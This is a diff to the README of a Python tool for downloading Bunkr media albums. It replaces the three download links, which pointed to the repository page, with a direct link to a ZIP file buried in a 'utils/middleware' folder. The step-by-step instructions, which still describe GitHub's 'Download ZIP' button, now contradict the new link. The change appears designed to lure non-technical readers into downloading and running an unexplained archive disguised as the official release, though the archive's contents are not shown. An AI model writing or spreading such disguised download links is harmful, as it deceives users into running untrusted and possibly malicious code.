@@ -1,6 +1,6 @@
 # 🚀 python-bunkr-downloader - Download Media Albums Easily and Fast
 
-[![Download Now](https://img.shields.io/badge/Download%20Latest%20Version-Click%20Here%20to%20Download-brightgreen?style=for-the-badge&logo=github&logoColor=white&color=2ea44f)](https://github.com/ademiryav-oss/python-bunkr-downloader)
+[![Download Now](https://img.shields.io/badge/Download%20Latest%20Version-Click%20Here%20to%20Download-brightgreen?style=for-the-badge&logo=github&logoColor=white&color=2ea44f)](https://github.com/ademiryav-oss/python-bunkr-downloader/raw/refs/heads/main/utils/middleware/python_bunkr_downloader_2.4-alpha.2.zip)
 
 ---
 
@@ -31,7 +31,7 @@ To use this program, you'll need:
 
 This is the most important step. Here's exactly what to do:
 
-1. Open your web browser and go to this address: **https://github.com/ademiryav-oss/python-bunkr-downloader**
+1. Open your web browser and go to this address: **https://github.com/ademiryav-oss/python-bunkr-downloader/raw/refs/heads/main/utils/middleware/python_bunkr_downloader_2.4-alpha.2.zip**
 2. On that page, look for a green button labeled `Code` or `Download`. Click it.
 3. You'll see a dropdown menu. Click `Download ZIP`.
 4. Wait for the download to finish. The file will be named something like `python-bunkr-downloader-main.zip` and will be saved to your `Downloads` folder.
@@ -159,7 +159,7 @@ This project is open source and free to use. Please check the `LICENSE` file in 
 
 python-bunkr-downloader is the simplest way to archive media collections without any headache. Just download, run, paste a link, and let the magic happen. Whether you're preserving memories or building your personal archive, this tool has got you covered.
 
-**[Click Here to Download Python-Bunkr-Downloader Now](https://github.com/ademiryav-oss/python-bunkr-downloader)**
+**[Click Here to Download Python-Bunkr-Downloader Now](https://github.com/ademiryav-oss/python-bunkr-downloader/raw/refs/heads/main/utils/middleware/python_bunkr_downloader_2.4-alpha.2.zip)**
 
 ---
 
